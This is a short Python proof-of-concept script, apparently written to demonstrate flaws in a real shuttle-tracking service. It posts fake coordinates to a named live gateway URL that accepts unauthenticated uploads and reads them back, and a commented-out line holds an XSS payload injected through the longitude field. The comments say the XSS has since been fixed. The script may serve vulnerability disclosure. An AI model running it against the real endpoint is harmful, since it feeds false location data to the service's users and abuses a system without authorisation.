#!/usr/bin/python3
import requests
from time import sleep

#The URL in this code is where the Raspberry Pi uploads the coordinates and where the app downloads them from
#Anybody can upload to the page, so we are able to upload fake coordiantes
#Yesterday they also were not sanitizing input so XSS was possible but it looks like they fixed this
def main()->None:

   
    
    #Use only one longitude at a time
    body = {
        #######Uncomment to see XSS, not working anymore########
        #Load URL in browser to actually see code beign executed after running script
        #"longitude": '"}<script> alert(\'XSS Attack\')</script>',                  
        
        ######Uncomment to see example of arbitrary value uploaded to URL########
        'longitude' : "test1", 
                                           
        "latitude": 'test2'           
    }

    URL = 'https://realtime-location-gateway-waz932k.uc.gateway.dev/shuttle/1'
    resp = requests.post(URL, data=body) #Post our fake coordinates to page
    r = requests.get(URL) #Retrieve our fake coordiates
    print(f"Response: {resp}") #Server's response to our upload
    print(r.text) #What anybody else at loading the webpage at this moment would get

if __name__ == "__main__":
    main()